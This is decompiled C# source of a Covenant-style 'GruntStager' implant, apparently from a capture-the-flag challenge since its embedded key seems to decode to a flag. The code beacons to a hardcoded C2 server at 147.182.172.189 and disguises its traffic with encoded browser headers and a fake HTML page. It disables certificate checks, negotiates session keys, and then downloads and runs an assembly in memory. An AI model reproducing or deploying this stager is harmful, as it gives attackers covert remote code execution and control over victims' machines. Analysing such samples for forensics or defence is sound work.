using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;

namespace GruntStager
{
	// Token: 0x02000002 RID: 2
	public class GruntStager
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public GruntStager()
		{
			this.ExecuteStager();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000205E File Offset: 0x0000025E
		[STAThread]
		public static void Main(string[] args)
		{
			new GruntStager();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000205E File Offset: 0x0000025E
		public static void Execute()
		{
			new GruntStager();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002068 File Offset: 0x00000268
		public void ExecuteStager()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder().Append("SFRCezFfd");
				stringBuilder.Append("GgwdWdodF9XTTFfdzRzX2p1c");
				stringBuilder.Append("3RfNF9NNE40ZzNtM2");
				stringBuilder.Append("50X1QwMGx9");
				List<string> list = "http://147.182.172.189:80".Split(new char[]
				{
					','
				}).ToList<string>();
				string CovenantCertHash = "";
				List<string> list2 = (from H in "VXNlci1BZ2VudA==,Q29va2ll".Split(new char[]
				{
					','
				}).ToList<string>()
				select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
				List<string> list3 = (from H in "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(new char[]
				{
					','
				}).ToList<string>()
				select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
				List<string> list4 = (from U in "L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(new char[]
				{
					','
				}).ToList<string>()
				select Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList<string>();
				string format = "i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
				string format2 = "<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {0}\n    </body>\n</html>".Replace(Environment.NewLine, "\n");
				bool ValidateCert = bool.Parse("false");
				bool UseCertPinning = bool.Parse("false");
				Random random = new Random();
				string str = "4e4a83dde4";
				string text = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
				byte[] key = Convert.FromBase64String(stringBuilder.ToString());
				string format3 = "{{\"GUID\":\"{0}\",\"Type\":{1},\"Meta\":\"{2}\",\"IV\":\"{3}\",\"EncryptedMessage\":\"{4}\",\"HMAC\":\"{5}\"}}";
				Aes aes = Aes.Create();
				aes.Mode = CipherMode.CBC;
				aes.Padding = PaddingMode.PKCS7;
				aes.Key = key;
				aes.GenerateIV();
				HMACSHA256 hmacsha = new HMACSHA256(key);
				RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048, new CspParameters());
				byte[] bytes = Encoding.UTF8.GetBytes(rsacryptoServiceProvider.ToXmlString(false));
				byte[] array = aes.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
				byte[] inArray = hmacsha.ComputeHash(array);
				string s = string.Format(format3, new object[]
				{
					str + text,
					"0",
					"",
					Convert.ToBase64String(aes.IV),
					Convert.ToBase64String(array),
					Convert.ToBase64String(inArray)
				});
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls);
				ServicePointManager.ServerCertificateValidationCallback = delegate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
				{
					bool flag = true;
					if (UseCertPinning && CovenantCertHash != "")
					{
						flag = (cert.GetCertHashString() == CovenantCertHash);
					}
					if (flag & ValidateCert)
					{
						flag = (errors == SslPolicyErrors.None);
					}
					return flag;
				};
				string arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s));
				GruntStager.CookieWebClient cookieWebClient = null;
				cookieWebClient = new GruntStager.CookieWebClient();
				cookieWebClient.UseDefaultCredentials = true;
				cookieWebClient.Proxy = WebRequest.DefaultWebProxy;
				cookieWebClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
				string text2 = "";
				foreach (string text3 in list)
				{
					try
					{
						for (int i = 0; i < list3.Count; i++)
						{
							if (list2[i] == "Cookie")
							{
								cookieWebClient.SetCookies(new Uri(text3), list3[i].Replace(";", ",").Replace("{GUID}", ""));
							}
							else
							{
								cookieWebClient.Headers.Set(list2[i].Replace("{GUID}", ""), list3[i].Replace("{GUID}", ""));
							}
						}
						cookieWebClient.DownloadString(text3 + list4[random.Next(list4.Count)].Replace("{GUID}", ""));
						text2 = text3;
					}
					catch
					{
					}
				}
				for (int j = 0; j < list3.Count; j++)
				{
					if (list2[j] == "Cookie")
					{
						cookieWebClient.SetCookies(new Uri(text2), list3[j].Replace(";", ",").Replace("{GUID}", text));
					}
					else
					{
						cookieWebClient.Headers.Set(list2[j].Replace("{GUID}", text), list3[j].Replace("{GUID}", text));
					}
				}
				string text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
				text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
				List<string> list5 = GruntStager.Parse(text4, format3);
				string s2 = list5[3];
				string s3 = list5[4];
				string a = list5[5];
				byte[] array2 = Convert.FromBase64String(s3);
				if (!(a != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
				{
					aes.IV = Convert.FromBase64String(s2);
					byte[] rgb = aes.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
					byte[] key2 = rsacryptoServiceProvider.Decrypt(rgb, true);
					Aes aes2 = Aes.Create();
					aes2.Mode = CipherMode.CBC;
					aes2.Padding = PaddingMode.PKCS7;
					aes2.Key = key2;
					aes2.GenerateIV();
					hmacsha = new HMACSHA256(aes2.Key);
					byte[] array3 = new byte[4];
					RandomNumberGenerator.Create().GetBytes(array3);
					byte[] array4 = aes2.CreateEncryptor().TransformFinalBlock(array3, 0, array3.Length);
					inArray = hmacsha.ComputeHash(array4);
					string s4 = string.Format(format3, new object[]
					{
						text,
						"1",
						"",
						Convert.ToBase64String(aes2.IV),
						Convert.ToBase64String(array4),
						Convert.ToBase64String(inArray)
					});
					arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s4));
					for (int k = 0; k < list3.Count; k++)
					{
						if (list2[k] == "Cookie")
						{
							cookieWebClient.SetCookies(new Uri(text2), list3[k].Replace(";", ",").Replace("{GUID}", text));
						}
						else
						{
							cookieWebClient.Headers.Set(list2[k].Replace("{GUID}", text), list3[k].Replace("{GUID}", text));
						}
					}
					text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
					text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
					List<string> list6 = GruntStager.Parse(text4, format3);
					s2 = list6[3];
					s3 = list6[4];
					string a2 = list6[5];
					array2 = Convert.FromBase64String(s3);
					if (!(a2 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
					{
						aes2.IV = Convert.FromBase64String(s2);
						byte[] src = aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
						byte[] array5 = new byte[4];
						byte[] array6 = new byte[4];
						Buffer.BlockCopy(src, 0, array5, 0, 4);
						Buffer.BlockCopy(src, 4, array6, 0, 4);
						if (!(Convert.ToBase64String(array3) != Convert.ToBase64String(array5)))
						{
							aes2.GenerateIV();
							byte[] array7 = aes2.CreateEncryptor().TransformFinalBlock(array6, 0, array6.Length);
							inArray = hmacsha.ComputeHash(array7);
							string s5 = string.Format(format3, new object[]
							{
								text,
								"2",
								"",
								Convert.ToBase64String(aes2.IV),
								Convert.ToBase64String(array7),
								Convert.ToBase64String(inArray)
							});
							arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s5));
							for (int l = 0; l < list3.Count; l++)
							{
								if (list2[l] == "Cookie")
								{
									cookieWebClient.SetCookies(new Uri(text2), list3[l].Replace(";", ",").Replace("{GUID}", text));
								}
								else
								{
									cookieWebClient.Headers.Set(list2[l].Replace("{GUID}", text), list3[l].Replace("{GUID}", text));
								}
							}
							text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
							text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
							List<string> list7 = GruntStager.Parse(text4, format3);
							s2 = list7[3];
							s3 = list7[4];
							string a3 = list7[5];
							array2 = Convert.FromBase64String(s3);
							if (!(a3 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
							{
								aes2.IV = Convert.FromBase64String(s2);
								Assembly.Load(aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length)).GetTypes()[0].GetMethods()[0].Invoke(null, new object[]
								{
									text2,
									CovenantCertHash,
									text,
									aes2
								});
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.Error.WriteLine(ex.Message + Environment.NewLine + ex.StackTrace);
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002ABC File Offset: 0x00000CBC
		public static List<string> Parse(string data, string format)
		{
			format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
			if (format.Contains("{0}"))
			{
				format = format.Replace("{0}", "(?'group0'.*)");
			}
			if (format.Contains("{1}"))
			{
				format = format.Replace("{1}", "(?'group1'.*)");
			}
			if (format.Contains("{2}"))
			{
				format = format.Replace("{2}", "(?'group2'.*)");
			}
			if (format.Contains("{3}"))
			{
				format = format.Replace("{3}", "(?'group3'.*)");
			}
			if (format.Contains("{4}"))
			{
				format = format.Replace("{4}", "(?'group4'.*)");
			}
			if (format.Contains("{5}"))
			{
				format = format.Replace("{5}", "(?'group5'.*)");
			}
			Match match = new Regex(format).Match(data);
			List<string> list = new List<string>();
			if (match.Groups["group0"] != null)
			{
				list.Add(match.Groups["group0"].Value);
			}
			if (match.Groups["group1"] != null)
			{
				list.Add(match.Groups["group1"].Value);
			}
			if (match.Groups["group2"] != null)
			{
				list.Add(match.Groups["group2"].Value);
			}
			if (match.Groups["group3"] != null)
			{
				list.Add(match.Groups["group3"].Value);
			}
			if (match.Groups["group4"] != null)
			{
				list.Add(match.Groups["group4"].Value);
			}
			if (match.Groups["group5"] != null)
			{
				list.Add(match.Groups["group5"].Value);
			}
			return list;
		}

		// Token: 0x02000003 RID: 3
		public class CookieWebClient : WebClient
		{
			// Token: 0x17000001 RID: 1
			// (get) Token: 0x06000006 RID: 6 RVA: 0x00002CDA File Offset: 0x00000EDA
			// (set) Token: 0x06000007 RID: 7 RVA: 0x00002CE2 File Offset: 0x00000EE2
			public CookieContainer CookieContainer { get; private set; }

			// Token: 0x06000008 RID: 8 RVA: 0x00002CEB File Offset: 0x00000EEB
			public CookieWebClient()
			{
				this.CookieContainer = new CookieContainer();
			}

			// Token: 0x06000009 RID: 9 RVA: 0x00002CFE File Offset: 0x00000EFE
			public void SetCookies(Uri uri, string cookies)
			{
				this.CookieContainer.SetCookies(uri, cookies);
			}

			// Token: 0x0600000A RID: 10 RVA: 0x00002D10 File Offset: 0x00000F10
			protected override WebRequest GetWebRequest(Uri address)
			{
				HttpWebRequest httpWebRequest = base.GetWebRequest(address) as HttpWebRequest;
				if (httpWebRequest == null)
				{
					return base.GetWebRequest(address);
				}
				httpWebRequest.CookieContainer = this.CookieContainer;
				return httpWebRequest;
			}
		}

		// Token: 0x02000004 RID: 4
		public static class MessageTransform
		{
			// Token: 0x0600000B RID: 11 RVA: 0x00002D42 File Offset: 0x00000F42
			public static string Transform(byte[] bytes)
			{
				return Convert.ToBase64String(bytes);
			}

			// Token: 0x0600000C RID: 12 RVA: 0x00002D4A File Offset: 0x00000F4A
			public static byte[] Invert(string str)
			{
				return Convert.FromBase64String(str);
			}
		}
	}
}
